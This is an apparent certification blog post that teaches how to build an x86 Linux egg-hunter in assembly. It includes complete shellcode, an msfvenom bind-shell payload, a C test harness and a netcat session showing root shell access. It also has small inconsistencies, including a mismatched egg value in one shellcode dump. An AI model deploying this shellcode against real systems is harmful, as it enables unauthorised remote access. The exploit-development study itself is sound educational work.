---
layout: single
title: SLAE Assignment 3 -- Egg Hunter
date: 2019-5-8
classes: wide
header:
  teaser: /assets/images/SLAE/SLAE.jpg
tags:
  - SLAE
  - Linux
  - x86
  - Shellcoding
--- 
![](/assets/images/SLAE/SLAE.jpg)

## Introduction

*"If I have seen further than others, it is by standing upon the shoulders of giants."*

*-Isaac Newton*

The third SLAE assignment is to develop shellcode for an 'egg hunter.' According to [Fuzzy Security](https://www.fuzzysecurity.com/tutorials/expDev/4.html), "an egg-hunter is composed of a set of programmatic instructions that are translated to opcode...to search the entire memory range \[stack, heap, etc\] for our final stage shellcode and redirect execution flow to it."

Sometimes when you are able to overflow a buffer on a program, the buffer size is too small to introduce traditional shellcode payloads such as bind or reverse shells. In this case, it is sometimes pertinent to implement an egg-hunter which is comparitively short in length and is capable of searching throughout memory space for an 'egg' which is nothing more than a tag prepended to your *real* shellcode. 

A 2004 paper by Skape entitled "[Safely Searching Process Virtual Address Space](http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf)" informed the vast majority of my research on the topic and my assembly code. 

## Key Concepts and Definitions

Before we jump into the code, let's go through some of the things that are important to understand Skape's egg-hunter. 

#### x86 Linux Memory Pages

According to [manybutfinite.com](https://manybutfinite.com/post/how-the-kernel-manages-your-memory/), "x86 processors in 32-bit mode support page sizes of 4KB, 2MB, and 4MB. Both Linux and Windows map the user portion of the virtual address space using 4KB pages. Bytes 0-4095 fall in page 0, bytes 4096-8191 fall in page 1, and so on."

This is an important concept because our egg-hunter will be iterating through pages of memory looking for its beloved egg. If we tell the egg-hunter to look for the egg in page 0 (bytes 0-4095) and the syscall we're using returns an exit code which states that the page of memory we're on is not accessible, we might as well skip to the next page of memory (page 1). 

Imagine you were reading a book with 50 chapters, each chapter was written in a different language, and each chapter had 10 pages. If you opened Chapter 1 and found that it was written in a language you do not understand, it would not make sense to continue to page 2 and continue reading. The entirety of Chapter 1 is inaccessible to us as we do not speak this language. We would skip to Chapter 2 and see if it is written in a language we understand. 

#### The Access Syscall

Skape has found a very clever way to determine whether or not a page of memory is accessible to the egg-hunter searching for its beloved egg which is to utilize the access syscall. According to the `man 2 access` page, access checks whether the calling process (our egg-hunter) can access the file pathname. 

The argument structure given in the `man 2 access` page is `int access(const char *pathname, int mode);`

+ `const char *pathname` = a location in memory to check `(ebx)`
+ `int mode` = `F_OK` which has a value of 0 `(ecx)`

Since syscalls store their exit codes in portions of the `eax` register, and the exit code for inaccessible memory (EFAULT) is given as [14](http://www-numi.fnal.gov/offline_software/srt_public_context/WebDocs/Errors/unix_system_errors.html), we can check the low byte value for `0xf2`. If our low-byte `al` when compared to `0xf2` matches, the zero flag will be set and we can create control flow to skip to the next page. 

If the access syscall returns any other value, we can keep searching the page as its accessible to us. 

#### Double Egg

Since our egg-hunter will contain exactly one reference to our egg, we will not want to search for just one instance of the egg or the egg-hunter could possibly find itself and call it a day. To work around this contingency, we can prepend our egg to our real shellcode twice so that the structure of our real shellcode would look like this: egg + egg + shellcode.

#### Thanks

Many thanks to Skape, Fuzzy Security, Abatchy and others who have published egg-hunter reference material so that it's consumable to the noob trying to learn.

## Building Our Assembly Code

### Assembly Skeleton Code

```nasm
global_start

section .txt
_start:
```
The first thing we want to do is store our 'egg' in a register. 

```nasm
global_start

section .txt
_start: 
  
    mov ebx, 0x50905090
```

Next we will clear the `ecx`, `eax`, and `edx` registers. The opcode `mul` will multiply its operand against the `eax` register and store the result in `eax` and `edx`, so in this case it's being multiplied by 0 and storing 0 in both `eax` and `edx`. This saves us a line of code. Shout out to @epi052 for explaining to me [how `mul` works.](https://c9x.me/x86/html/file_module_x86_id_210.html) 

```nasm
    xor ecx, ecx
    mul ecx
```
#### First Function, `page_forward:`

The first function we build into the code will be to increment 1 page in the event that we hit a page that is inaccessible to us (`al` = `0xf2`). 

By using a bitwise logical `or`, we're able to make sure we increment by multiples of `4095` ensuring that we don't skip a page. You can test this on Kali as follows:

```terminal_session
root@kali:~/petprojects# ipython
Python 2.7.15+ (default, Feb  3 2019, 13:13:16) 
Type "copyright", "credits" or "license" for more information.

IPython 5.8.0 -- An enhanced Interactive Python.
?         -> Introduction and overview of IPython's features.
%quickref -> Quick reference.
help      -> Python's own help system.
object?   -> Details about 'object', use 'object??' for extra details.

In [1]: int(0 | 0xfff)
Out[1]: 4095

In [2]: int(4094 | 0xfff)
Out[2]: 4095

In [3]: int(4095 | 0xfff)
Out[3]: 4095

In [4]: int(4096 | 0xfff)
Out[4]: 8191

In [5]: int(8191 | 0xfff)
Out[5]: 8191

In [6]: int(8192 | 0xfff)
Out[6]: 12287
```

As you can see, if we're inside the first 4095 bytes in `dx`, then our logical `or` will still net us 4095 as our value. The second we increment by 1 to 4096 as our `edx` value, we are now going to end up at 8191 as our value. The reason we can't simply put 4096 into the register is because the hex (`0x1000`) would introduce a NULL BYTE. 

```nasm
    page_forward:
    or dx, 0xfff
```

#### Second Function, `address_check:`

Next we need to increment `edx` by one to get us to a nice multiple of 4096. We will also push our register values onto the stack with `pushad` in order to preserve them as we make syscalls. 

We will then satisfy the `const char *pathname` argument for the access syscall in `ebx` by loading the effective address of `[edx]+4`. This will check to see if these bytes are readable to us.

`cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep accept` tells us that the syscall code is 33 (`0x21`), so we'll load that into `al` and call the interrupt vector. 

```nasm
    address_check:
    inc edx
    pushad
    lea ebx, [edx +4]
    mov al, 0x21
    int 0x80
```

### Compare Op Code

The [compare `CMP` opcode](https://c9x.me/x86/html/file_module_x86_id_35.html) takes two operands and subtracts them, if the result is a 0 the zero-flag is set and you know that the two operands are equal.

We will compare the return code of the accept and restore the registers by popping them off of the stack since we're done with the syscall. If `al` is the same as `0xf2`, then we know we got an EFAULT and this page of memory is inaccessible to us and we `JMP` to our `page_forward` function to skip to the next page. 

If the memory page is readable to us, we will compare the value of what is stored at `edx` with `ebx` which holds our egg. If it does not match, we will `JMP` to our `address_check` function and keep reading through the page.

If the value of what is stored at `edx` matches our egg, then we have to see if `[edx]+4` also does so that we satisfy our double-egg requirement. If it is only found once, then it's probably just our egg-hunter finding itself.

Finally, both `CMP` calls result in zeros then we tell the code to `JMP` to `edx` which will execute the code stored there (our real payload). 

```nasm
    cmp al, 0xf2
    popad
    jz page_forward
    
    cmp [edx], ebx
    jnz address_check
    
    cmp [edx+4], ebx
    jnz address_check
    
    jmp edx
```

## Completed Assembly Code 

```nasm
global_start

section .text
_start:
  
mov ebx, 0x50905090	; here, we're just going to store a 4 byte value in $ebx as our egg
xor ecx, ecx		
mul ecx

page_forward:		; here, we're going to design a function of what to do if we get an EFAULT error
or dx, 0xfff		; doing a bitwise logical OR against the $dx value

address_check:		; here we're going to design a function to check the next 8 bytes of mem
inc edx			; gets $edx to a nice multiple of 4096
pushad			; this will preserve our register values by pushing them onto a stack while we syscall
lea ebx, [edx+4]	; putting edx plus 8 to check if this fresh page is readable by us
mov al, 0x21		; syscall for access(), we know this by now :)
int 0x80

cmp al, 0xf2		; does the low-end of $eax equal 0xf2? In other words, did we get an EFAULT? 
popad			; restore our register values we preserved
jz page_forward		; if we got an EFAULT, this page is unreadable, time to go to the next page!

cmp [edx], ebx		; is what is stored at the address of $edx our egg (0x50905090) ?
jnz address_check	; if it's not, let's advance into the page and see if we can't find that pesky egg

cmp [edx+4], ebx	; we found our egg once, let's see if it's also in $edx + 4
jnz address_check	; we found it once but not twice, have to keep looking

jmp edx			; we found it twice! go to edx (where our egg is) and execute the code there! 
```

## Shellcode

To get our shellcode, we can run this nifty command `objdump -d ./<PROGRAM>|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'`

Our shellcode is: 
```terminal_session
\xbb\xad\xde\xad\xde\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42\x60\x8d\x5a\x04\xb0\x21\xcd\x80\x3c\xf2\x61\x74\xed\x39\x1a\x75\xee\x39\x5a\x04\x75\xe9\xff\xe2
```

Looks to be null free!

## Final Testing

We'll need to add both the egg hunter shellcode and a real shellcode to our shellcode.c program and test it. Don't forget to prepend your egg to your payload twice. To generate some shellcode, let's use msfvenom to generate a bind shell.

```terminal_session
root@kali:~/petprojects# msfvenom -p linux/x86/shell_bind_tcp lport=1234 -f c
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 78 bytes
Final size of c file: 354 bytes
unsigned char buf[] = 
"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80"
"\x5b\x5e\x52\x68\x02\x00\x04\xd2\x6a\x10\x51\x50\x89\xe1\x6a"
"\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0"
"\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f"
"\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0"
"\x0b\xcd\x80";
```

We'll put this in our shellcode.c program along with our egg-hunter and then call the 'hunter' which will find the 'bind' and run it. 

```c
#include <stdio.h>
#include <string.h>

unsigned char hunter[] = "\xbb\x90\x50\x90\x50\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42\x60\x8d\x5a\x04\xb0\x21\xcd\x80\x3c\xf2\x61\x74\xed\x39\x1a\x75\xee\x39\x5a\x04\x75\xe9\xff\xe2";
unsigned char bind[] = "\x90\x50\x90\x50\x90\x50\x90\x50\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x5b\x5e\x52\x68\x02\x00\x04\xd2\x6a\x10\x51\x50\x89\xe1\x6a\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

int main(void)
{
    printf("Egg hunter length: %d\n", strlen(hunter));
    printf("Shellcode length: %d\n", strlen(bind));

    void (*s)() = (void *)hunter;
    s();

    return 0;
}
```

Compile the shellcode.c program with `gcc -fno-stack-protector -z execstack -m32 shellcode.c -o egg_hunt` and run `./egg_hunt`

```terminal_session
root@kali:~# ./egghunter
Egg hunter length: 39
Shellcode length: 28
```

```terminal_session
root@kali:~# nc localhost 1234
whoami
root
pwd
/root
uname -a
Linux kali 4.17.0-kali1-686 #1 SMP Debian 4.17.8-1kali1 (2018-07-24) i686 GNU/Linux
```

It works!!

##Github

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
<http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/>

Student ID: SLAE-1458

You can find all of the code used in this blog post [here.](https://github.com/h0mbre/SLAE/tree/master/Assignment3)





